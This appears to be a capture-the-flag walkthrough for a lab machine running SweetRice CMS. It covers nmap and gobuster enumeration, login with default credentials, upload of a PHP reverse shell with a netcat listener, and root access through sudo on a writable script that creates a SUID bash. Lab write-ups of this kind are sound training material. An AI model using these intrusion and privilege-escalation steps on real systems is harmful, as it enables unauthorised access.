Target: 10.10.44.43

**Let's do initial scan with nmap**

    nmap -Pn -T4 -oA initial_scans 10.10.44.43
    PORT     STATE    SERVICE
    22/tcp   open     ssh
    80/tcp   open     http
    2910/tcp filtered tdaccess

================================

**Let's do initial scan with nmap** 
    
    nmap -Pn -p 80,22,2910 -A -oA full_scans 10.10.44.43
    PORT     STATE  SERVICE  VERSION
    22/tcp   open   ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
    |   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
    |_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
    80/tcp   open   http     Apache httpd 2.4.18 ((Ubuntu))
    |_http-title: Apache2 Ubuntu Default Page: It works
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    2910/tcp closed tdaccess

So it's an ubuntu os running ***apache 2.4.18*** and ***OpenSSH 7.2p2***

===============================

**Now let's run gobuster for some directory enumeraion**

    dir -u http://10.10.44.43// -w /usr/share/wordlists/dirb/common.txt 
    /content              (Status: 301) [Size: 312] [--> http://10.10.44.43/content/]
    /index.html           (Status: 200) [Size: 11321]
    /index.html           (Status: 200) [Size: 11321]
    /server-status        (Status: 403) [Size: 276]

We found ***/content*** after checking it out there is SweetRice operating.

===============================

**let's run the scan again on: http://10.10.44.43/content**

    gobuster dir -u http://10.10.44.43/content -w /usr/share/wordlists/dirb/common.txt

    /_themes              (Status: 301) [Size: 320] [--> http://10.10.44.43/content/_themes/]
    /as                   (Status: 301) [Size: 315] [--> http://10.10.44.43/content/as/]
    /attachment           (Status: 301) [Size: 323] [--> http://10.10.44.43/content/attachment/]
    /images               (Status: 301) [Size: 319] [--> http://10.10.44.43/content/images/]
    /inc                  (Status: 301) [Size: 316] [--> http://10.10.44.43/content/inc/]
    /index.php            (Status: 200) [Size: 2197]
    /js                   (Status: 301) [Size: 315] [--> http://10.10.44.43/content/js/]

Found login page on ***/as***
===============================

after searching the web for default creds, got the following creds:
User: manager
Password: Password123

===============================

After login in head over to Post section and add ***shell.php5*** revershe shell

Fire up nc in your terminal: nc -lvnp 1234

then head over to ***http://10.10.44.43/content/attachment/shell.php5***

Boom you got your reversee shell

===============================

**Let's run a find command to serach the user flag**

    find / -type f -name user.txt 2>/dev/null
    /home/itguy/user.txt
    cat /home/itguy/user.txt

# Like that we got your user flag

===============================

**Now let's do some enumeration for priv esc**

***mysql creds***
/home/itguy/mysql_login.txt
rice:randompass
# running lenepeas we found

    User www-data may run the following commands on THM-Chal:
        (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

===============================

    cat /home/itguy/backup.pl
    #!/usr/bin/perl

    system("sh", "/etc/copy.sh");

    cat /etc/copy.sh
    cp /bin/bash /tmp/bash;chmod +s /tmp/bash

    ls -al /etc/copy.sh
    -rw-r--rwx 1 root root 42 Jul  2 08:29 /etc/copy.sh

# We have write permision on this file so let's modify it.

    echo "cp /bin/bash /tmp/bash;chmod +s /tmp/bash" > /etc/copy.sh

# now let's execute backup.pl with sudo

    sudo /usr/bin/perl /home/itguy/backup.pl

# now let's use the suid to get the root:
    cd /tmp
    ./bash -p
    cat /root/root.txt